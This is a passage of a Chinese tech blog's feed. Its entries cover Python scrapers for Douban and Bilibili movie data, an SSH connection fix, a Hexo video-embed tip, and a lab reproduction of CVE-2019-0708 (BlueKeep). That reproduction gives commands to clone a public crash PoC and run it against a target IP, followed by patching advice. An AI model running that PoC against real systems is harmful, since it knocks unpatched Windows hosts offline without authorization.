    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>hello大家好，这里是TeamsSix，昨天晚上11点多的突然想在B站看电影了，但是又不知道那个电影值得看，于是首先想到的是去各大影评UP主的频道里面看看，转了几圈后发现他们讲解的电影B站很多都没有，这个时候又想到了一种方法，就是在B站搜索：“在B站值得看的电影”，没想到以前还真有UP主统计过：</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie1.png" alt><br>点进去之后发现UP主居然手动统计了160多部电影，最后他做成了一个表格，看完了之后立刻给了三连，因为在我看来每一位付出了努力与汗水的UP主都值得被尊重（疯狂暗示），事后就想到能不能用我这三脚猫的Python水平统计一下B站最值得看的电影呢？<br>有了想法，立刻从床上爬了起来，在夜黑风高的晚上开始垒起了代码，终于经历了一个通宵的时间之后完成了这个想法。</p><h1 id="0x01-代码运行"><a href="#0x01-代码运行" class="headerlink" title="0x01 代码运行"></a>0x01 代码运行</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie2.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie3.png" alt></p><blockquote><p>具体代码见文章底部链接</p></blockquote><h1 id="0x02-运行结果"><a href="#0x02-运行结果" class="headerlink" title="0x02 运行结果"></a>0x02 运行结果</h1><p>通过刚才的运行结果，可以看到，播放数量最高的是《你的名字》，足足有一千八百多万的播放量<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie4.png" alt><br>弹幕数量最高的还是《你的名字》，有高达98万条弹幕<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie5.png" alt><br>硬币数量最多的依然是《你的名字》，硬币数量达到了39万个<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie6.png" alt><br>追剧人数最高的《命运之夜–天之杯：恶兆之花》<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie7.png" alt><br>B站评分最高的不详，因为评分最高9.9的视频比较多，所以B站评分没有统计到视频最后的汇总里<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie8.png" alt><br>在B站的电影中豆瓣评分最高的是《武林外传》，高达9.5分<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie9.png" alt><br>B站评分与豆瓣评分差最大的是《深夜食堂》，两个平台差了7分，这部电影我也看过，表示还阔以，不明白为什么豆瓣评分那么低。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie10.png" alt><br>ok，最后我们再来总结一下，B站的电影中播放数量、弹幕数量、硬币数量最高的均为《你的名字》，可以说是B站电影区当之无愧的C位，其余《刀剑神域：序列之争》《声之形》《白蛇：缘起》也都经常出现在前三之中。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie11.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie12.png" alt></p><h1 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h1><p>在视频的最后再简单说两句，这些数据都是可以导出为表格的，另外在写代码的中间有个小插曲，就是在获取豆瓣搜索结果中电影评分的时候，发现电影数据都是被加密的，就像这个样子<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie13.png" alt><br>最后通过SergioJune在Github上提供的代码得以解决，在这里也向他表示感谢<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie14.png" alt></p><blockquote><p>文章代码：<a href="https://github.com/teamssix/bilibili-movie" target="_blank" rel="noopener">https://github.com/teamssix/bilibili-movie</a></p></blockquote><p>演示视频：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=56117996&cid=98086981&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av56117996/" title="源链接" target="_blank" rel="noopener">源链接</a>观看。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;hello大家好，这里是TeamsSix，昨天晚上11点多的突然想在B站看电影了，但是又不知道那个电影值得看，于是首先想到的是去各大影评UP主的频道里面看看，转了几圈后发现他们讲解的电影B站很多都没有，这个时候又想到了一种方法，就是在B站搜索：“在B站值得看的电影”，没想到以前还真有UP主统计过：&lt;/p&gt;
    
    </summary>
    
      <category term="实例演示" scheme="http://www.teamssix.com/categories/%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA/"/>
    
    
      <category term="Python" scheme="http://www.teamssix.com/tags/Python/"/>
    
      <category term="电影" scheme="http://www.teamssix.com/tags/%E7%94%B5%E5%BD%B1/"/>
    
      <category term="爬虫" scheme="http://www.teamssix.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>【Python实例】让Python告诉你当前最火的电影是什么</title>
    <link href="http://www.teamssix.com/year/190618-225704.html"/>
    <id>http://www.teamssix.com/year/190618-225704.html</id>
    <published>2019-06-18T14:57:04.000Z</published>
    <updated>2019-10-16T09:32:33.632Z</updated>
    
    <content type="html"><![CDATA[<p>话不多说，先让我们看看最终效果图：</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm1.png" alt><br>那么如何使用Python来获取这些信息呢？</p><h1 id="一、需求与思路"><a href="#一、需求与思路" class="headerlink" title="一、需求与思路"></a>一、需求与思路</h1><h1 id="1、需求"><a href="#1、需求" class="headerlink" title="1、需求"></a>1、需求</h1><p>首先要知道最近正在上映的电影的名称、评分、评论数等等，这些都可以在豆瓣上找得到，因此本次数据挖掘对象就确定为豆瓣电影官网。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm2.png" alt></p><h1 id="2、思路"><a href="#2、思路" class="headerlink" title="2、思路"></a>2、思路</h1><p>a、调用requests模块向豆瓣电影官网发出请求<br>b、调用BeautifulSoup模块从返回的html中提取数据<br>c、调用pandas模块将提取的数据转为表格样式</p><h1 id="二、开工"><a href="#二、开工" class="headerlink" title="二、开工"></a>二、开工</h1><h1 id="1、发出请求"><a href="#1、发出请求" class="headerlink" title="1、发出请求"></a>1、发出请求</h1><p>设置好headers,url，调用requests模块向目标网站发出请求，最后结果存储在res中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">headers = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&apos;&#125;</span><br><span class="line">url = &apos;https://movie.douban.com/cinema/nowplaying/beijing/&apos;</span><br><span class="line">res = requests.get(url,headers = headers)</span><br></pre></td></tr></table></figure><h1 id="2、数据传入"><a href="#2、数据传入" class="headerlink" title="2、数据传入"></a>2、数据传入</h1><p>将html文本传入BeautifulSoup中，指定解析器为html.parser，并将解析内容传入soup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(res.text,&apos;html.parser&apos;)</span><br></pre></td></tr></table></figure><h1 id="三、数据提取"><a href="#三、数据提取" class="headerlink" title="三、数据提取"></a>三、数据提取</h1><p>在介绍数据提取之前需要先介绍一个插件：infolite，这款插件可以直接查看到控件路径，而不需要到复杂的开发人员工具中就行查看。</p><h1 id="1、电影名"><a href="#1、电影名" class="headerlink" title="1、电影名"></a>1、电影名</h1><p>打开电影详情页面，找到电影名控件路径<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm3.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm4.png" alt><br>最终修改为以下结果得到电影名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insoup.select(&apos;h1&apos;)[0].text.split()[0]</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm5.png" alt></p><h1 id="2、豆瓣评分"><a href="#2、豆瓣评分" class="headerlink" title="2、豆瓣评分"></a>2、豆瓣评分</h1><p>根据同样原理可得到该电影的评分<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm6.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insoup.select(&apos;.rating_num&apos;)[0].text</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm7.png" alt></p><h1 id="3、评论数量"><a href="#3、评论数量" class="headerlink" title="3、评论数量"></a>3、评论数量</h1><p>依旧是一样的思路，先利用InfoLite找到控件路径，再利用bs4模块提取对应内容。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm8.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insoup.select(&apos;.mod-hd a&apos;)[1].text.split()[1]</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm9.png" alt></p><h1 id="4、简介"><a href="#4、简介" class="headerlink" title="4、简介"></a>4、简介</h1><p>对于简介因为里面有很多空格换行等，所以这里使用了正则替换空格。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm10.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.sub(&apos;\s&apos;,&apos;&apos;,insoup.select(&apos;.related-info span&apos;)[0].text)</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm11.png" alt><br>这里写个函数，为实现传入一个URL，返回该URL中信息的功能，最终四项都将传入result字典中，所以接下来要做的就是如何获取URL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def pages(url):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    inres = requests.get(url,headers = headers)</span><br><span class="line">    insoup = BeautifulSoup(inres.text,&apos;html.parser&apos;)</span><br><span class="line">    </span><br><span class="line">    result[&apos;电影名&apos;] = insoup.select(&apos;h1&apos;)[0].text.split()[0]</span><br><span class="line">    result[&apos;豆瓣评分&apos;] = insoup.select(&apos;.rating_num&apos;)[0].text</span><br><span class="line">    result[&apos;评论数量&apos;] = insoup.select(&apos;.mod-hd a&apos;)[1].text.split()[1]</span><br><span class="line">    result[&apos;简介&apos;] = re.sub(&apos;\s&apos;,&apos;&apos;,insoup.select(&apos;.related-info span&apos;)[0].text)</span><br><span class="line">    </span><br><span class="line">    return result</span><br></pre></td></tr></table></figure><h1 id="四、提取URL"><a href="#四、提取URL" class="headerlink" title="四、提取URL"></a>四、提取URL</h1><p>因为我们要找的电影是正在上映的电影，因此从正在上映的电影列表中提取URL即可。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm12.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://movie.douban.com/cinema/nowplaying/beijing/&apos;</span><br><span class="line">res = requests.get(url,headers = headers)</span><br><span class="line">soup = BeautifulSoup(res.text,&apos;html.parser&apos;)</span><br></pre></td></tr></table></figure><p>在soup中含有这些链接，soup.select()是列表类型，有的列表项含有URL，有的不含有，并且在调试过程中发现有的含有链接的却没有评分信息。<br>因此在以下语句中URL利用select存到urls中，利用判断语句来筛选掉一些没有评分的电影。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pools = []</span><br><span class="line">for links in soup.select(&apos;ul&apos;):</span><br><span class="line">    urls = links.select(&apos;a&apos;)[0][&apos;href&apos;]</span><br><span class="line">    if len(links.select(&apos;.subject-rate&apos;)) &gt; 0 :</span><br><span class="line">        pools.append(pages(urls))</span><br></pre></td></tr></table></figure><p>最终，每个URL的信息都被添加到pools数组中，但是这个时候直接输出pools会很乱，因此接下来要做的就是生成表格。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm13.png" alt></p><h1 id="五、表格生成"><a href="#五、表格生成" class="headerlink" title="五、表格生成"></a>五、表格生成</h1><p>生成表格的方法也非常简单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pandas</span><br><span class="line">df = pandas.DataFrame(pools)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm14.png" alt><br>不过这样不够明显，因此我们可以将简介放到后面，再排序一下<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm15.png" alt></p><h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>上面一张图可以明显看到今天的四个贺岁电影中，《流浪星球》不管是豆瓣评分还是评论的数量都是第一个，倒也是实至名归。<br>在整个过程中，碰到了很多问题，其中不乏有还未解决的问题，比如在提取电影标签的时候，因为正则使用的不熟而一直没有被很好的提取出来。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm16.png" alt><br>在做这个数据挖掘之前，还做了新浪新闻的信息抓取，这个电影信息的数据挖掘也相当于是练练手，后面还有的导出文档、导出到数据库的功能就没有做演示了，也是几行代码的事情。<br>用了一段时间Python后，真的不得不感叹到Python的强大之处，下面就把以上项目的全部代码展示出来吧，另外我还是个新手，代码写得十分笨拙，大佬还请绕步。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import pandas</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">headers = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&apos;&#125;</span><br><span class="line">url = &apos;https://movie.douban.com/cinema/nowplaying/beijing/&apos;</span><br><span class="line">res = requests.get(url,headers = headers)</span><br><span class="line">soup = BeautifulSoup(res.text,&apos;html.parser&apos;)</span><br><span class="line">pools = []</span><br><span class="line">for links in soup.select(&apos;ul&apos;):</span><br><span class="line">    urls = links.select(&apos;a&apos;)[0][&apos;href&apos;]</span><br><span class="line">    if len(links.select(&apos;.subject-rate&apos;)) &gt; 0 :</span><br><span class="line">        pools.append(pages(urls))</span><br><span class="line">df = pandas.DataFrame(pools,columns = [&apos;电影名&apos;,&apos;豆瓣评分&apos;,&apos;评论数量&apos;,&apos;简介&apos;])</span><br><span class="line">df.sort_values(&apos;豆瓣评分&apos;,inplace = True,ascending = False)</span><br><span class="line">df</span><br><span class="line"></span><br><span class="line">def pages(url):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    inres = requests.get(url,headers = headers)</span><br><span class="line">    insoup = BeautifulSoup(inres.text,&apos;html.parser&apos;)</span><br><span class="line">    </span><br><span class="line">    result[&apos;电影名&apos;] = insoup.select(&apos;h1&apos;)[0].text.split()[0]</span><br><span class="line">    result[&apos;豆瓣评分&apos;] = insoup.select(&apos;.rating_num&apos;)[0].text</span><br><span class="line">    result[&apos;评论数量&apos;] = insoup.select(&apos;.mod-hd a&apos;)[1].text.split()[1]</span><br><span class="line">    result[&apos;简介&apos;] = re.sub(&apos;\s&apos;,&apos;&apos;,insoup.select(&apos;.related-info span&apos;)[0].text)</span><br><span class="line">    </span><br><span class="line">    return result</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;话不多说，先让我们看看最终效果图：&lt;/p&gt;
    
    </summary>
    
      <category term="实例演示" scheme="http://www.teamssix.com/categories/%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA/"/>
    
    
      <category term="Python" scheme="http://www.teamssix.com/tags/Python/"/>
    
      <category term="电影" scheme="http://www.teamssix.com/tags/%E7%94%B5%E5%BD%B1/"/>
    
      <category term="爬虫" scheme="http://www.teamssix.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？</title>
    <link href="http://www.teamssix.com/year/190615-013724.html"/>
    <id>http://www.teamssix.com/year/190615-013724.html</id>
    <published>2019-06-14T17:37:24.000Z</published>
    <updated>2019-10-16T09:33:22.017Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><blockquote><p>2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。</p></blockquote><p>以上内容来自360网络安全响应中心。<br>从微软官方的消息一出，各大安全厂商都开始发布了漏洞预警，那段时间我也一直在找对应的POC，但要不就是不能利用的POC，要不就是利用以前漏洞写的POC，更有甚着点击attack后给你惊喜。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07081.gif" alt><br>看到这个图片的时候，真的一副生无可恋的样子，随着时间推移，渐渐的也就不怎么关注这个漏洞了。<br>直到今天，看到网上有人发一些关于这个漏洞的利用复现视频的时候，才意识到已经过去正好一个月的，此时POC也早就被公布了。<br>早在在5月31日的时候，n1xbyte就在Github上发布了利用该漏洞导致系统蓝屏的可用POC ,所以我们来复现看看吧。</p><h1 id="0x01-下载POC"><a href="#0x01-下载POC" class="headerlink" title="0x01 下载POC"></a>0x01 下载POC</h1><p>首先git clone代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n1xbyte/CVE-2019-0708.git</span><br><span class="line">cd CVE-2019-0708</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07082.png" alt></p><h1 id="0x02-开始复现"><a href="#0x02-开始复现" class="headerlink" title="0x02 开始复现"></a>0x02 开始复现</h1><p>1、为了顺利复现成功，需要将被攻击机的远程桌面设为允许，防火墙也需要关掉。<br>2、被攻击机的IP地址与操作系统信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#被攻击主机</span><br><span class="line">ip地址：192.168.1.106</span><br><span class="line">系统类型：64位</span><br></pre></td></tr></table></figure><p>3、安装需要的库后执行POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install impacket</span><br><span class="line">python3 crashpoc.py 192.168.1.106 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07083.png" alt><br>POC被成功被执行，虽然现阶段只是让目标蓝屏，但是对这个漏洞的利用手段绝对不会止步于此。</p><h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>1、最简便的方法就是安装一个安全管家，比如火绒、360之类的<br>2、把系统的自动更新打开或者到微软官网<a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">下载补丁</a><br>3、把自己电脑上的远程桌面关掉、防火墙开启</p><h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>总是有人说没有绝对的安全，当然事实也确实是如此，但是只要我们平时养成一个良好的安全习惯，还是可以避免很多病毒木马的侵害的，毕竟很多的恶意程序都是广撒网，捕的鱼多不多就是另一回事儿了。</p><p><strong>最后再次强调，不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></p><p>下面为视频演示：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=55626994&cid=97251766&page=1" " scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av55626994/" title="视频地址" target="_blank" rel="noopener">视频地址</a>进行观看。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以上内容来自360网络安全响应中心。&lt;br&gt;从微软官方的消息一出，各大安全厂商都开始发布了漏洞预警，那段时间我也一直在找对应的POC，但要不就是不能利用的POC，要不就是利用以前漏洞写的POC，更有甚着点击attack后给你惊喜。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="CVE 2019-0708" scheme="http://www.teamssix.com/tags/CVE-2019-0708/"/>
    
  </entry>
  
  <entry>
    <title>对于连接ssh时连时断的解决方法</title>
    <link href="http://www.teamssix.com/year/190614-134948.html"/>
    <id>http://www.teamssix.com/year/190614-134948.html</id>
    <published>2019-06-14T05:49:48.000Z</published>
    <updated>2019-06-14T05:51:53.826Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近用ssh连接VPS的时候，发生了很诡异的事件，有时能够连接上ssh，有时就死活连接不上，重新安装、公钥私钥都检查了，各种权限也都没有问题，端口监听地址什么的也都配置正常，总之能想到的办法都想过了，此时连不连的上仿佛就要看脸了，下面记录一下最终的解决办法。</p><a id="more"></a><h1 id="0x01-修改配置文件"><a href="#0x01-修改配置文件" class="headerlink" title="0x01 修改配置文件"></a>0x01 修改配置文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>在配置文件中加入以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UseDNS no</span><br></pre></td></tr></table></figure><p>之后重启ssh即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#Ubuntu:</span><br><span class="line">service sshd restart 或者 /etc/init.d/sshd restart</span><br><span class="line">#Centos7:</span><br><span class="line">systemctl restart sshd.service</span><br><span class="line">#Centos7以下版本：</span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><h1 id="0x02-原因"><a href="#0x02-原因" class="headerlink" title="0x02 原因"></a>0x02 原因</h1><p>以下解释来自本文方法参考文章：<a href="https://m.ancii.com/ayew4gv3/" target="_blank" rel="noopener">文章地址</a></p><blockquote><p>ssh登录服务器时总是要停顿等待一下才能连接上,这是因为OpenSSH服务器有一个DNS查找选项UseDNS默认是打开的。<br>UseDNS选项打开状态下,当客户端试图登录OpenSSH服务器时,服务器端先根据客户端的IP地址进行DNS PTR反向查询,查询出客户端的host name，然后根据查询出的客户端host name进行DNS 正向A记录查询，验证与其原始IP地址是否一致，这是防止客户端欺骗的一种手段,但一般我们的IP是动态的，不会有PTR记录的，打开这个选项不过是在白白浪费时间而已。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近用ssh连接VPS的时候，发生了很诡异的事件，有时能够连接上ssh，有时就死活连接不上，重新安装、公钥私钥都检查了，各种权限也都没有问题，端口监听地址什么的也都配置正常，总之能想到的办法都想过了，此时连不连的上仿佛就要看脸了，下面记录一下最终的解决办法。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="http://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="解决方案" scheme="http://www.teamssix.com/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    
      <category term="ssh" scheme="http://www.teamssix.com/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>hexo自适应BiliBili视频大小的解决方案</title>
    <link href="http://www.teamssix.com/year/190614-111512.html"/>
    <id>http://www.teamssix.com/year/190614-111512.html</id>
    <published>2019-06-14T03:15:12.000Z</published>
    <updated>2019-10-16T09:34:59.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-未修改"><a href="#0x00-未修改" class="headerlink" title="0x00 未修改"></a>0x00 未修改</h1><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=55224540&amp;cid=96981660&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&gt; &lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>直接将B站中的视频插入地址放入文章MarkDown中的效果如下：</p><iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>这个视频也太小了，而且不能全屏，很难受，于是在网上看到有人用自定义调节视频的高宽。</p><h1 id="0x01-自定义高宽"><a href="#0x01-自定义高宽" class="headerlink" title="0x01 自定义高宽"></a>0x01 自定义高宽</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=55224540&amp;cid=96981660&amp;page=1&quot; width=&quot;780&quot; height=&quot;480&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&gt; &lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>就是在原来的基础上加入了宽高，效果类似这样：</p><iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" width="780" height="480" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>自定义调节视频高宽虽然可以解决这个问题，但是手机上又是另一翻景象，你看：  </p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili2.png" alt></p><p>这就更难受了，于是在网上找遍各种自适应视频大小的方案，最终找到以下这种方案。</p><h1 id="0x02-自适应视频大小"><a href="#0x02-自适应视频大小" class="headerlink" title="0x02 自适应视频大小"></a>0x02 自适应视频大小</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 